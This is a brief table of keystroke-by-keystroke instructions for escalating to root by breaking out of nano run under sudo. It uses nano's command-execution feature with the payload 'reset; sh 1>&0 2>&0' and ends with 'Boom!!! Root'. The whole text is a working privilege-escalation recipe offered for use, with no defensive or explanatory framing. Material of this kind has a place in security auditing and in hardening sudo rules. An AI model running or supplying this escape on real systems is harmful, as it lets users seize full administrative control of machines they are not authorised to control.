| ----- | ----------------------------------------------------------- |
| 1     | type sudo nano                                              |
| 2     | press Ctrl+R                                                |
| 3     | press Ctrl+X                                                |
| 4     | type `reset; sh 1>&0 2>&0`                                  |
| 5     | press Enter                                                 |
| 6     | You will see a # and the screen will be a bit funny looking | 
| 7     | type clear and enter                                        |
| 8     | Boom!!! Root                                                |
